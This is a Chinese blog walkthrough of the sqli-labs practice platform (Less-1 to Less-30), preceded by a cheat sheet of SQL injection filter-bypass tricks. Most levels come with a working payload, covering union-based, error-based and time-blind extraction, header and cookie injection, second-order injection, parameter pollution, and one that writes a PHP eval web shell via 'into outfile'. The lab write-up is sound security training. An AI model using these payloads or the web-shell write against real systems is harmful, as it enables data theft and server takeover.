+<h4 id="比较符"><a href="#比较符" class="headerlink" title="比较符"></a>比较符</h4><p>大于、小于可用 <code>greatest(), least()</code> 代替，还可以 <code>between and</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure>
+<h4 id="条件连接词"><a href="#条件连接词" class="headerlink" title="条件连接词"></a>条件连接词</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用符号:</span><br><span class="line"><span class="keyword">and</span> =&gt; &amp;&amp;</span><br><span class="line"><span class="keyword">or</span> =&gt; ||</span><br><span class="line"><span class="keyword">xor</span> =&gt; |</span><br><span class="line">not =&gt; !</span><br><span class="line"></span><br><span class="line">大小写变形: <span class="keyword">Or</span>, <span class="keyword">OR</span>, <span class="keyword">oR</span></span><br><span class="line">添加注释: o<span class="comment">/**/</span>r</span><br><span class="line">编码：hex, urlencode</span><br></pre></td></tr></table></figure>
+<h4 id="union-select-where"><a href="#union-select-where" class="headerlink" title="union, select, where"></a>union, select, where</h4><p>（1）使用注释符绕过：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//，-- , /**/, #, --+, -- -, ;,%00,--a</span></span><br><span class="line"><span class="keyword">U</span><span class="comment">/**/</span> NION <span class="comment">/**/</span> <span class="keyword">SE</span><span class="comment">/**/</span> LECT <span class="comment">/**/</span>user，<span class="keyword">pwd</span> from user</span><br><span class="line"></span><br><span class="line">sele%<span class="keyword">ct</span> <span class="keyword">IIS</span> 服务器可以插入 %</span><br></pre></td></tr></table></figure>
+<p>（2）使用大小写绕过：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'<span class="built_in">UnIoN</span><span class="comment">/**/</span><span class="built_in">SeLeCT</span></span><br></pre></td></tr></table></figure>
+<p>（3）内联注释绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1'<span class="comment">/*!UnIoN*/</span> <span class="keyword">SeLeCT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>) <span class="keyword">FrOM</span> <span class="comment">/*information_schema*/</span>.tables <span class="comment">/*!WHERE */</span><span class="comment">/*!TaBlE_ScHeMa*/</span> <span class="keyword">like</span> <span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>（4） 双关键字绕过：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'UNIunionONSeLselectECT1,<span class="number">2</span>,<span class="number">3</span>–-</span><br></pre></td></tr></table></figure>
+<p>（5）科学计数法</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id</span>=<span class="number">0</span>e1union</span><br></pre></td></tr></table></figure>
+<h4 id="表名等关键词"><a href="#表名等关键词" class="headerlink" title="表名等关键词"></a>表名等关键词</h4><p>以information_schema.tables为例</p>
+<p>空格 <code>information_schema . tables</code></p>
+<p>着重号 <code>information&lt;/em&gt;schema.tables</code></p>
+<p>特殊符 <code>/!informationschema.tables/</code></p>
+<p>别名 <code>information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)</code></p>
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>常用注释符：<code>#, --+, /**/</code>，可以用 <code>;%00</code> 代替</p>
+<p>不用注释符，与后面的语句构造闭合就行，如 <code>||&#39;1</code>，恰好与 <code>’ LIMIT 0,1</code> 闭合</p>
+<h4 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h4><p>使用 <code>like 、rlike 、regexp</code> 或者  <code>&lt; , &gt;</code></p>
+<h3 id="部署练习平台"><a href="#部署练习平台" class="headerlink" title="部署练习平台"></a>部署练习平台</h3><ul>
+<li>手工搭建法</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Audi-1/sqli-labs.git</span><br><span class="line"></span><br><span class="line">修改 sql-connections/sql-labs/db-creds.inc 中 MySQL用户名/密码</span><br><span class="line">再放到 Apache 下或者 PHPstudy 这种集成工具</span><br><span class="line"></span><br><span class="line">From your browser access the sql-labs folder to load index.html</span><br><span class="line">Click on the link setup/resetDB to create database, create tables and populate Data.</span><br><span class="line">Labs ready to be used, click on lesson number to open the lesson page.</span><br><span class="line">Enjoy the labs</span><br></pre></td></tr></table></figure>
+<ul>
+<li>简单粗暴法</li>
+</ul>
+<p><a href="https://www.jianshu.com/p/2ad3edf3c61f" target="_blank" rel="noopener">docker配置sqli-labs</a></p>
+<h2 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h2><h3 id="Less-1-Error-based-Single-quotes"><a href="#Less-1-Error-based-Single-quotes" class="headerlink" title="Less-1 Error based - Single quotes"></a>Less-1 Error based - Single quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-2-Error-based-Double-quotes"><a href="#Less-2-Error-based-Double-quotes" class="headerlink" title="Less-2 Error based - Double quotes"></a>Less-2 Error based - Double quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-3-Error-based-Single-quotes-with-twist"><a href="#Less-3-Error-based-Single-quotes-with-twist" class="headerlink" title="Less-3 Error based - Single quotes with twist"></a>Less-3 Error based - Single quotes with twist</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1') union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-4-Error-based-Double-Quotes"><a href="#Less-4-Error-based-Double-Quotes" class="headerlink" title="Less-4 Error based - Double Quotes"></a>Less-4 Error based - Double Quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1") union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-5-Double-Injection-Single-Quotes"><a href="#Less-5-Double-Injection-Single-Quotes" class="headerlink" title="Less-5 Double Injection - Single Quotes"></a>Less-5 Double Injection - Single Quotes</h3><p>二次注入有点懵逼，直接注入没有任何回显，函数报错盲注搞起</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure>
+<h3 id="Less-6-Double-Injection-Double-Quotes"><a href="#Less-6-Double-Injection-Double-Quotes" class="headerlink" title="Less-6 Double Injection - Double Quotes"></a>Less-6 Double Injection - Double Quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure>
+<h3 id="Less-7-Dump-into-outfile"><a href="#Less-7-Dump-into-outfile" class="headerlink" title="Less-7 Dump into outfile"></a>Less-7 Dump into outfile</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST[1])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\a.php'</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="Less-8-Blind-Boolean-Based-Single-Quotes"><a href="#Less-8-Blind-Boolean-Based-Single-Quotes" class="headerlink" title="Less-8 Blind - Boolean Based - Single Quotes"></a>Less-8 Blind - Boolean Based - Single Quotes</h3><p>没有任何报错信息，无法直接根据报错注入，时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1' and if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>, <span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>))=<span class="number">68</span> ,<span class="number">1</span> , <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-9、Less-10-这两个与-8-类似"><a href="#Less-9、Less-10-这两个与-8-类似" class="headerlink" title="Less-9、Less-10 这两个与 8 类似"></a>Less-9、Less-10 这两个与 8 类似</h3><h3 id="Less-11-Error-Based-Single-quotes"><a href="#Less-11-Error-Based-Single-quotes" class="headerlink" title="Less-11 Error Based - Single quotes"></a>Less-11 Error Based - Single quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1' union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1") union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>发现有报错信息，尝试报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1') and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>双引号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<h3 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h3><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>利用 update 注入，有明显的报错信息，可以报错注入，并且没有验证之前的密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-18-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18 Header Injection  - Uagent field - Error based"></a>Less-18 Header Injection  - Uagent field - Error based</h3><p>UA 注入，要先登录才有回显，注意闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-19-Header-Injection-Referer-field-Error-based"><a href="#Less-19-Header-Injection-Referer-field-Error-based" class="headerlink" title="Less-19 Header Injection  - Referer field - Error based"></a>Less-19 Header Injection  - Referer field - Error based</h3><h3 id="Less-20-Cookie-injection-Uagent-field-Error-based"><a href="#Less-20-Cookie-injection-Uagent-field-Error-based" class="headerlink" title="Less-20 Cookie injection - Uagent field - Error based"></a>Less-20 Cookie injection - Uagent field - Error based</h3><p>cookie 注入，同样有报错，改了cookie后不会影响登录状态吗？</p>
+<h3 id="Less-21-Less-22-与前面的类似"><a href="#Less-21-Less-22-与前面的类似" class="headerlink" title="Less-21 Less-22 与前面的类似"></a>Less-21 Less-22 与前面的类似</h3><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>发现 <code>#, --</code> 被过滤，可换 <code>;%00</code>，或者直接闭合单引号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>();%00</span><br><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">'3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 报错注入</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure>
+<h3 id="Less-24-Second-Oder-Injections-Real-treat-Stored-injection"><a href="#Less-24-Second-Oder-Injections-Real-treat-Stored-injection" class="headerlink" title="Less-24 Second Oder Injections Real treat - Stored injection"></a>Less-24 Second Oder Injections <em>Real treat</em> - Stored injection</h3><p>二次排序注入，将可能导致 sql 注入的字符先存入数据库，当再次调用这个恶意构造的字符时，就可以触发注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pa'</span>;</span><br></pre></td></tr></table></figure>
+<p>对于本题的 <code>sql</code> 语句来说，如果先注册一个 <code>admin&#39;#</code> 用户，此用户改密码的时候也修改了 <code>admin</code> 的密码。</p>
+<p>所以有无严格控制用户的输入对安全影响特别大。</p>
+<h3 id="Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25 Error Based - All your OR &amp; AND belong to us - integer based"></a>Less-25 Error Based - All your OR &amp; AND belong to us - integer based</h3><p>题意是说过滤了 <code>or, and</code>，并且展示了过滤后的字符串在下方，同时也有报错，所以方法很多</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2' union <span class="keyword">select</span> <span class="number">1</span>, <span class="keyword">database</span>(), <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p><code>or, and</code> 可以用 <code>||, &amp;&amp;</code> 代替，本题还可用 <code>o/**/r</code> 或者 <code>oorr</code></p>
+<h3 id="Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25a Blind Based - All your OR &amp; AND belong to us - integer based"></a>Less-25a Blind Based - All your OR &amp; AND belong to us - integer based</h3><p>与 Less-25 大同小异</p>
+<h3 id="Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）"><a href="#Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）" class="headerlink" title="Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）"></a>Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）</h3><p>尝试了所有的空白符，居然都不行，有个 <code>%a0</code> 没被过滤，但是不解析，不过 Linux 上可以成功解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//过滤空白符，如换行、换页、空格、制表符</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);	<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27union%a0select%a01,database(),3;%00  <span class="comment">-- linux（phpstudy上不解析，待研究）</span></span><br><span class="line">?id=0%27union(<span class="keyword">select</span>(<span class="number">1</span>),<span class="keyword">database</span>(),<span class="number">3</span>);%00  <span class="comment">-- 直接用括号分隔</span></span><br><span class="line">?id=-1%27anandd(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">user</span>())),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure>
+<h3 id="Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26a Blind based - All your SPACES and COMMENTS belong to us"></a>Less-26a Blind based - All your SPACES and COMMENTS belong to us</h3><p>多了个 <code>()</code> ，没有报错回显，依然 <code>%a0</code>，也可以盲注</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">27</span>)<span class="class"><span class="keyword">union</span>(<span class="title">select</span>(1),<span class="title">database</span>(),3);</span>%<span class="number">0</span>0</span><br></pre></td></tr></table></figure>
+<h3 id="Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us"><a href="#Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us" class="headerlink" title="Less-27 Error based - All your UNION and SELECT belong to us"></a>Less-27 Error based - All your UNION and SELECT belong to us</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/[\/\*]/'</span>, <span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>, <span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>, <span class="string">""</span>, $id);		<span class="comment">//Strip out #.</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/select/m'</span>, <span class="string">""</span>, $id);	<span class="comment">//Strip out spaces.</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/union/s'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/select/s'</span>, <span class="string">""</span>, $id);	<span class="comment">//Strip out select</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/UNION/s'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/SELECT/s'</span>, <span class="string">""</span>, $id);	<span class="comment">//Strip out SELECT</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/Union/s'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/Select/s'</span>, <span class="string">""</span>, $id);	<span class="comment">//Strip out select</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>select, union, 空格</code> 过滤不彻底</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%<span class="number">27</span>and(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seLect%<span class="number">0</span>aflag%<span class="number">0</span>afrom%<span class="number">0</span>aflag),<span class="number">0x7e</span>)));%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">"%0aUnIon%0aSElecT%0a1,(SeLect%0aflag%0afrom%0aflag),"</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/union\s+select/i'</span>, <span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
+<p>不能同时出现 <code>union select</code>，还是遇到了之前那个 <code>%a0</code> 不解析的问题，但是可以 <code>union all select</code>，科学计数法 <code>0e1union</code> 也不行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0')%0aunion%0aall%0aseLect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database();%00</span><br></pre></td></tr></table></figure>
+<p>如果可以报错注入的话</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2')%0aand%0a(extractvalue(1,concat(0x7e,(<span class="keyword">seLect</span>%<span class="number">0</span>agroup_concat(table_name)%<span class="number">0</span>afrom%<span class="number">0</span>ainformation_schema.tables%<span class="number">0</span>awhere%<span class="number">0</span>atable_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure>
+<h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>与 28 差不多，并且过滤还减少了。。</p>
+<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>一旦输入不是数字，直接跳到 <code>hacked.php</code>，一看源码可知存在 <code>HPP</code>即参数污染，这实际上是一个逻辑问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$id1 = java_implimentation($qs);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数污染在这里，php 同时接到两个一样的参数，以后一个为准</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">whitelist($id1);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  <span class="comment">// 为啥不插 $id1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">	$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">	<span class="keyword">if</span> (!$match) &#123;</span><br><span class="line">		header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一找到 id 就返回，即返回的是第一个 id 的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span> </span>&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>($val==<span class="string">"id"</span>) &#123;</span><br><span class="line">			$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> $id_value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题一旦发现是参数污染，即入无人之境，毫无过滤。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&amp;id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>与 29 同，只是拼接了一个 <code>“”</code>。</p>
